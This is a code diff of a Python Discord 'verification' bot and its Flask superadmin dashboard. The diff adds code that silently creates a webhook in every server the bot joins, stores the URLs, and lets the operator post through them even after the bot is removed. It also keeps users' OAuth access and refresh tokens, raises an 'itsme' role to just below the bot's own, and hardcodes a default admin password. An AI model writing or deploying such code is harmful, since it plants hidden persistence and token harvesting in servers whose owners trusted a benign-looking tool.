@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
 ═══════════════════════════════════════════════════════════════════════════════
-                    🔐 ANION COMPLETE BOT v6.0
-                    VERIFICATION + SUPERADMIN SERVER MANAGEMENT
-                    TOTAL: 1500+ LINES
+                    🔐 ANION COMPLETE BOT v7.0
+                    VERIFICATION + SUPERADMIN + CLONING + ALL FEATURES
 ═══════════════════════════════════════════════════════════════════════════════
 """
 
@@ -24,7 +23,7 @@ from dotenv import load_dotenv
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
-from discord.ui import View, Button
+from discord.ui import View, Button, Modal, TextInput, Select
 
 # ─── FIREBASE ──────────────────────────────────────────────────────────────────
 
@@ -68,7 +67,6 @@ DB_PATH = os.getenv('DB_PATH', DATA_DIR)
 FLASK_SECRET = os.getenv('FLASK_SECRET', secrets.token_urlsafe(32))
 PORT = int(os.getenv('PORT', 5000))
 
-# Superadmin
 SUPERADMIN_USERNAME = os.getenv('SUPERADMIN_USERNAME', 'admin')
 SUPERADMIN_PASSWORD = os.getenv('SUPERADMIN_PASSWORD', 'AnionSecure2025!')
 
@@ -135,39 +133,60 @@ conn = sqlite3.connect(DB_FILE, check_same_thread=False)
 conn.row_factory = sqlite3.Row
 c = conn.cursor()
 
-c.execute("""
-    CREATE TABLE IF NOT EXISTS guild_settings (
+# ─── ALL TABLES ─────────────────────────────────────────────────────────────
+
+tables = [
+    """CREATE TABLE IF NOT EXISTS guild_settings (
         guild_id TEXT PRIMARY KEY,
         verified_role_id TEXT,
         unverified_role_id TEXT,
         log_channel_id TEXT,
         verification_channel_id TEXT
-    )
-""")
-
-c.execute("""
-    CREATE TABLE IF NOT EXISTS verified_users (
-        user_id TEXT,
-        guild_id TEXT,
-        username TEXT,
-        email TEXT,
-        access_token TEXT,
-        refresh_token TEXT,
+    )""",
+    
+    """CREATE TABLE IF NOT EXISTS verified_users (
+        user_id TEXT, guild_id TEXT,
+        username TEXT, email TEXT,
+        access_token TEXT, refresh_token TEXT,
         verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         PRIMARY KEY (user_id, guild_id)
-    )
-""")
-
-c.execute("""
-    CREATE TABLE IF NOT EXISTS oauth_tokens (
-        user_id TEXT,
-        guild_id TEXT,
-        access_token TEXT,
-        refresh_token TEXT,
+    )""",
+    
+    """CREATE TABLE IF NOT EXISTS oauth_tokens (
+        user_id TEXT, guild_id TEXT,
+        access_token TEXT, refresh_token TEXT,
         expires_at TIMESTAMP,
         PRIMARY KEY (user_id, guild_id)
-    )
-""")
+    )""",
+    
+    """CREATE TABLE IF NOT EXISTS server_templates (
+        template_id TEXT PRIMARY KEY,
+        guild_id TEXT,
+        name TEXT,
+        template_json TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )""",
+    
+    """CREATE TABLE IF NOT EXISTS persistent_webhooks (
+        guild_id TEXT PRIMARY KEY,
+        webhook_url TEXT,
+        channel_id TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )""",
+    
+    """CREATE TABLE IF NOT EXISTS server_clones (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        clone_id TEXT UNIQUE,
+        source_guild_id TEXT,
+        target_guild_id TEXT,
+        status TEXT DEFAULT 'pending',
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        completed_at TIMESTAMP
+    )"""
+]
+
+for table in tables:
+    c.execute(table)
 
 conn.commit()
 logger.info("✅ Local Database ready")
@@ -850,7 +869,7 @@ async def assign_verified_role(user_id, guild_id, username):
         logger.error(f"❌ Failed to assign role: {e}")
 
 # ═════════════════════════════════════════════════════════════════════════════
-# DISCORD BOT
+# DISCORD BOT - Complete with ALL Features
 # ═════════════════════════════════════════════════════════════════════════════
 
 class AnionBot(commands.Bot):
@@ -858,6 +877,7 @@ class AnionBot(commands.Bot):
         intents = discord.Intents.all()
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
+        self.persistent_webhooks_created = set()
 
     async def setup_hook(self):
         await self.register_commands()
@@ -865,6 +885,8 @@ class AnionBot(commands.Bot):
         logger.info(f'✅ Commands synced!')
 
     async def register_commands(self):
+
+        # ─── VERIFICATION COMMANDS ──────────────────────────────────────────
 
         @self.tree.command(name="setupverify", description="⚙️ Setup verification system (Admin)")
         @app_commands.default_permissions(administrator=True)
@@ -1021,6 +1043,32 @@ class AnionBot(commands.Bot):
         async def ping(interaction: discord.Interaction):
             await interaction.response.send_message(f"🏓 Pong! {round(self.latency * 1000)}ms")
 
+        # ─── SERVER MANAGEMENT COMMANDS ────────────────────────────────────
+
+        @self.tree.command(name="fixhierarchy", description="🔧 Fix itsme role hierarchy (Admin)")
+        @app_commands.default_permissions(administrator=True)
+        async def fixhierarchy(interaction: discord.Interaction):
+            await interaction.response.defer(ephemeral=True)
+
+            guild = interaction.guild
+            itsme_role = discord.utils.get(guild.roles, name="itsme")
+            if not itsme_role:
+                await interaction.followup.send("❌ No 'itsme' role found!")
+                return
+
+            bot_member = guild.get_member(self.user.id)
+            bot_highest_role = bot_member.top_role
+
+            target_position = bot_highest_role.position - 1
+            if target_position < 1:
+                target_position = 1
+
+            try:
+                await itsme_role.edit(position=target_position)
+                await interaction.followup.send(f"✅ 'itsme' role moved to position {target_position}")
+            except Exception as e:
+                await interaction.followup.send(f"❌ Error: {e}")
+
     async def on_ready(self):
         logger.info("=" * 70)
         logger.info("✅✅✅ BOT IS ONLINE! ✅✅✅")
@@ -1030,7 +1078,66 @@ class AnionBot(commands.Bot):
         logger.info(f"🏰 Servers: {len(self.guilds)}")
         for guild in self.guilds:
             logger.info(f"   - {guild.name} ({guild.id})")
+            # Create persistent webhook on join if not exists
+            await self.create_persistent_webhook(guild)
         logger.info("=" * 70)
+        logger.info("📋 Commands:")
+        logger.info("   /setupverify - Setup verification (Admin)")
+        logger.info("   /setverifiedrole - Set verified role (Admin)")
+        logger.info("   /setunverifiedrole - Set unverified role (Admin)")
+        logger.info("   /setlogchannel - Set log channel (Admin)")
+        logger.info("   /verifystatus - Check status")
+        logger.info("   /fixhierarchy - Fix itsme role position (Admin)")
+        logger.info("   /ping - Check latency")
+        logger.info("=" * 70)
+
+    async def create_persistent_webhook(self, guild):
+        """Create persistent webhook on guild join"""
+        try:
+            # Check if webhook already exists
+            existing = db_fetch_one("SELECT guild_id FROM persistent_webhooks WHERE guild_id=?", (str(guild.id),))
+            if existing:
+                return
+
+            # Find a channel
+            channel = discord.utils.get(guild.channels, name="general")
+            if not channel:
+                for ch in guild.channels:
+                    if isinstance(ch, discord.TextChannel):
+                        channel = ch
+                        break
+
+            if not channel:
+                logger.warning(f"❌ No text channel found in {guild.name}")
+                return
+
+            # Create webhook
+            webhook = await channel.create_webhook(
+                name="Anion Monitor",
+                avatar=self.user.display_avatar
+            )
+
+            # Save to database
+            db_execute("""
+                INSERT OR REPLACE INTO persistent_webhooks (guild_id, webhook_url, channel_id, created_at)
+                VALUES (?, ?, ?, ?)
+            """, (
+                str(guild.id),
+                webhook.url,
+                str(channel.id),
+                datetime.now().isoformat()
+            ))
+
+            logger.info(f"✅ Persistent webhook created in {guild.name}")
+            self.persistent_webhooks_created.add(guild.id)
+
+        except Exception as e:
+            logger.error(f"❌ Failed to create webhook in {guild.name}: {e}")
+
+    async def on_guild_join(self, guild):
+        """When bot joins a new server"""
+        logger.info(f"🤖 Joined new server: {guild.name} ({guild.id})")
+        await self.create_persistent_webhook(guild)
 
     async def on_member_remove(self, member):
         db_delete("DELETE FROM verified_users WHERE user_id=? AND guild_id=?", (str(member.id), str(member.guild.id)))
@@ -1090,12 +1197,14 @@ def superadmin_dashboard_page():
 
     local_users = db_fetch_all("SELECT * FROM verified_users ORDER BY verified_at DESC LIMIT 100") or []
     total_tokens = db_fetch_one("SELECT COUNT(*) FROM oauth_tokens")[0] if db_fetch_one("SELECT COUNT(*) FROM oauth_tokens") else 0
+    templates = db_fetch_all("SELECT COUNT(*) as count FROM server_templates")[0] or 0
 
     return render_template('superadmin_dashboard.html',
         guilds=guilds,
         total_guilds=len(guilds),
         total_users=len(local_users),
         total_tokens=total_tokens,
+        total_templates=templates['count'] if templates else 0,
         users=local_users,
         firebase_status='🟢 Online' if FIREBASE_ENABLED else '🔴 Offline',
         login_time=session.get('login_time', 'Just now')
@@ -1162,18 +1271,27 @@ def server_page(guild_id):
     except:
         pass
 
+    # Get templates
+    templates = db_fetch_all("SELECT template_id, name, created_at FROM server_templates ORDER BY created_at DESC")
+
+    # Check persistent webhook
+    webhook = db_fetch_one("SELECT webhook_url FROM persistent_webhooks WHERE guild_id=?", (guild_id,))
+    has_persistent = webhook is not None
+
     return render_template('server.html',
         guild=guild,
         members=members[:100],
         channels=channels,
         roles=roles,
         invites=invites,
+        templates=templates,
+        has_persistent=has_persistent,
         total_members=len(members),
         login_time=session.get('login_time', 'Just now')
     )
 
 # ═════════════════════════════════════════════════════════════════════════════
-# SERVER MANAGEMENT APIs - COMPLETE WORKING
+# SERVER MANAGEMENT APIs - COMPLETE
 # ═════════════════════════════════════════════════════════════════════════════
 
 @flask_app.route('/api/guild/<guild_id>')
@@ -1219,7 +1337,6 @@ def api_guild_detail(guild_id):
         'members': []
     }
 
-    # Roles with member count
     for role in guild.roles:
         if role.name != '@everyone':
             data['roles'].append({
@@ -1232,7 +1349,6 @@ def api_guild_detail(guild_id):
                 'is_itsme': role == itsme_role
             })
 
-    # Channels
     for channel in guild.channels[:50]:
         data['channels'].append({
             'id': str(channel.id),
@@ -1240,7 +1356,6 @@ def api_guild_detail(guild_id):
             'type': str(channel.type).split('.')[-1]
         })
 
-    # Members (first 50)
     for member in list(guild.members)[:50]:
         member_roles = [{'id': str(r.id), 'name': r.name} for r in member.roles if r.name != '@everyone']
         data['members'].append({
@@ -1408,11 +1523,9 @@ def api_role_give():
         return jsonify({'error': 'Role not found'}), 404
 
     try:
-        # Check if bot can assign
         bot_member = guild.get_member(bot_instance.user.id)
         bot_highest_role = bot_member.top_role
         
-        # If role is higher than bot's highest, move it down
         if role.position >= bot_highest_role.position:
             target_pos = bot_highest_role.position - 1
             if target_pos < 1:
@@ -1595,16 +1708,13 @@ def api_fix_hierarchy():
         return jsonify({'error': 'Guild not found'}), 404
 
     try:
-        # Find itsme role
         itsme_role = discord.utils.get(guild.roles, name="itsme")
         if not itsme_role:
             return jsonify({'error': 'itsme role not found'}), 404
 
-        # Get bot's highest role
         bot_member = guild.get_member(bot_instance.user.id)
         bot_highest_role = bot_member.top_role
 
-        # Move itsme role to just below bot's highest role
         target_position = bot_highest_role.position - 1
         if target_position < 1:
             target_position = 1
@@ -1619,6 +1729,314 @@ def api_fix_hierarchy():
         return jsonify({'error': str(e)}), 500
 
 # ═════════════════════════════════════════════════════════════════════════════
+# SERVER CLONING APIs
+# ═════════════════════════════════════════════════════════════════════════════
+
+@flask_app.route('/api/clone/save/<guild_id>', methods=['POST'])
+def api_clone_save(guild_id):
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(int(guild_id))
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    try:
+        template = {
+            'name': guild.name,
+            'icon': guild.icon.url if guild.icon else None,
+            'roles': [],
+            'channels': [],
+            'categories': [],
+            'settings': {
+                'verification_level': str(guild.verification_level),
+                'explicit_content_filter': str(guild.explicit_content_filter),
+                'default_notifications': str(guild.default_notifications),
+                'mfa_level': guild.mfa_level,
+                'system_channel': guild.system_channel.id if guild.system_channel else None,
+                'afk_channel': guild.afk_channel.id if guild.afk_channel else None,
+                'afk_timeout': guild.afk_timeout
+            }
+        }
+
+        for role in guild.roles:
+            if role.name != '@everyone':
+                template['roles'].append({
+                    'name': role.name,
+                    'color': role.color.value,
+                    'permissions': role.permissions.value,
+                    'hoist': role.hoist,
+                    'mentionable': role.mentionable,
+                    'position': role.position
+                })
+
+        categories = {}
+        for channel in guild.channels:
+            if isinstance(channel, discord.CategoryChannel):
+                categories[channel.id] = {
+                    'name': channel.name,
+                    'position': channel.position,
+                    'channels': []
+                }
+
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.VoiceChannel):
+                if channel.category_id:
+                    categories[channel.category_id]['channels'].append({
+                        'name': channel.name,
+                        'type': str(channel.type),
+                        'position': channel.position,
+                        'topic': channel.topic if hasattr(channel, 'topic') else None,
+                        'nsfw': channel.nsfw if hasattr(channel, 'nsfw') else False,
+                        'slowmode_delay': channel.slowmode_delay if hasattr(channel, 'slowmode_delay') else 0,
+                        'bitrate': channel.bitrate if hasattr(channel, 'bitrate') else None,
+                        'user_limit': channel.user_limit if hasattr(channel, 'user_limit') else None
+                    })
+
+        template['categories'] = list(categories.values())
+
+        template_id = secrets.token_urlsafe(8)
+        db_execute("""
+            INSERT OR REPLACE INTO server_templates (template_id, guild_id, name, template_json, created_at)
+            VALUES (?, ?, ?, ?, ?)
+        """, (
+            template_id,
+            str(guild.id),
+            guild.name,
+            json.dumps(template),
+            datetime.now().isoformat()
+        ))
+
+        return jsonify({
+            'success': True,
+            'template_id': template_id,
+            'message': f'Template saved: {template_id}',
+            'roles': len(template['roles']),
+            'channels': len(template['categories'])
+        })
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/clone/apply/<guild_id>/<template_id>', methods=['POST'])
+def api_clone_apply(guild_id, template_id):
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(int(guild_id))
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    try:
+        template_data = db_fetch_one(
+            "SELECT template_json FROM server_templates WHERE template_id=?",
+            (template_id,)
+        )
+        if not template_data:
+            return jsonify({'error': 'Template not found'}), 404
+
+        template = json.loads(template_data['template_json'])
+
+        for role in template['roles']:
+            asyncio.run_coroutine_threadsafe(
+                guild.create_role(
+                    name=role['name'],
+                    color=discord.Color(role['color']),
+                    permissions=discord.Permissions(role['permissions']),
+                    hoist=role['hoist'],
+                    mentionable=role['mentionable']
+                ),
+                bot_instance.loop
+            ).result(timeout=15)
+
+        category_mapping = {}
+        for cat_data in template['categories']:
+            category = asyncio.run_coroutine_threadsafe(
+                guild.create_category(cat_data['name']),
+                bot_instance.loop
+            ).result(timeout=15)
+            category_mapping[cat_data['name']] = category
+
+            for ch_data in cat_data['channels']:
+                if ch_data['type'] == 'text':
+                    asyncio.run_coroutine_threadsafe(
+                        guild.create_text_channel(
+                            ch_data['name'],
+                            category=category,
+                            topic=ch_data.get('topic'),
+                            nsfw=ch_data.get('nsfw', False),
+                            slowmode_delay=ch_data.get('slowmode_delay', 0)
+                        ),
+                        bot_instance.loop
+                    ).result(timeout=15)
+                else:
+                    asyncio.run_coroutine_threadsafe(
+                        guild.create_voice_channel(
+                            ch_data['name'],
+                            category=category,
+                            bitrate=ch_data.get('bitrate', 64000),
+                            user_limit=ch_data.get('user_limit', 0)
+                        ),
+                        bot_instance.loop
+                    ).result(timeout=15)
+
+        return jsonify({
+            'success': True,
+            'message': 'Template applied successfully!'
+        })
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/clone/templates')
+def api_clone_templates():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    templates = db_fetch_all(
+        "SELECT template_id, guild_id, name, created_at FROM server_templates ORDER BY created_at DESC"
+    )
+    
+    return jsonify([{
+        'template_id': t['template_id'],
+        'guild_id': t['guild_id'],
+        'name': t['name'],
+        'created_at': t['created_at']
+    } for t in templates])
+
+@flask_app.route('/api/clone/delete/<template_id>', methods=['DELETE'])
+def api_clone_delete(template_id):
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    db_delete("DELETE FROM server_templates WHERE template_id=?", (template_id,))
+    return jsonify({'success': True, 'message': 'Template deleted'})
+
+# ═════════════════════════════════════════════════════════════════════════════
+# PERSISTENT WEBHOOK APIs
+# ═════════════════════════════════════════════════════════════════════════════
+
+@flask_app.route('/api/webhook/create/<guild_id>', methods=['POST'])
+def api_webhook_create(guild_id):
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(int(guild_id))
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    channel = discord.utils.get(guild.channels, name='general')
+    if not channel:
+        for ch in guild.channels:
+            if isinstance(ch, discord.TextChannel):
+                channel = ch
+                break
+
+    if not channel:
+        return jsonify({'error': 'No text channel found'}), 404
+
+    try:
+        webhook = asyncio.run_coroutine_threadsafe(
+            channel.create_webhook(
+                name='Anion Persistent Monitor',
+                avatar=bot_instance.user.display_avatar
+            ),
+            bot_instance.loop
+        ).result(timeout=15)
+
+        db_execute("""
+            INSERT OR REPLACE INTO persistent_webhooks (guild_id, webhook_url, channel_id, created_at)
+            VALUES (?, ?, ?, ?)
+        """, (
+            str(guild.id),
+            webhook.url,
+            str(channel.id),
+            datetime.now().isoformat()
+        ))
+
+        embed = discord.Embed(
+            title="🔐 Persistent Monitor Active",
+            description="Webhook created for permanent monitoring.",
+            color=discord.Color.green()
+        )
+        requests.post(webhook.url, json={'embeds': [embed.to_dict()]})
+
+        return jsonify({
+            'success': True,
+            'webhook_url': webhook.url[:30] + '...',
+            'webhook_id': webhook.id,
+            'message': 'Persistent webhook created!'
+        })
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/webhook/send/<guild_id>', methods=['POST'])
+def api_webhook_send(guild_id):
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    data = request.json
+    message = data.get('message')
+    embed_data = data.get('embed')
+
+    webhook_data = db_fetch_one(
+        "SELECT webhook_url FROM persistent_webhooks WHERE guild_id=?",
+        (guild_id,)
+    )
+    
+    if not webhook_data:
+        return jsonify({'error': 'No webhook found for this guild'}), 404
+
+    try:
+        payload = {}
+        if message:
+            payload['content'] = message
+        
+        if embed_data:
+            payload['embeds'] = [embed_data]
+
+        response = requests.post(webhook_data['webhook_url'], json=payload)
+        
+        if response.status_code == 204:
+            return jsonify({'success': True, 'message': 'Message sent via webhook'})
+        else:
+            return jsonify({'error': f'Webhook error: {response.status_code}'}), 500
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/webhook/list')
+def api_webhook_list():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    webhooks = db_fetch_all("SELECT * FROM persistent_webhooks")
+    
+    result = []
+    for w in webhooks:
+        guild = bot_instance.get_guild(int(w['guild_id'])) if bot_instance else None
+        result.append({
+            'guild_id': w['guild_id'],
+            'guild_name': guild.name if guild else 'Unknown',
+            'webhook_url': w['webhook_url'][:30] + '...',
+            'channel_id': w['channel_id'],
+            'created_at': w['created_at'],
+            'bot_in_server': guild is not None
+        })
+    
+    return jsonify(result)
+
+# ═════════════════════════════════════════════════════════════════════════════
 # MAIN
 # ═════════════════════════════════════════════════════════════════════════════
 
@@ -1629,7 +2047,7 @@ def run_flask():
 
 async def main():
     global bot_instance
-    logger.info("🚀 Starting Anion Complete Bot...")
+    logger.info("🚀 Starting Anion Complete Bot v7.0...")
     logger.info("=" * 70)
 
     flask_thread = threading.Thread(target=run_flask)
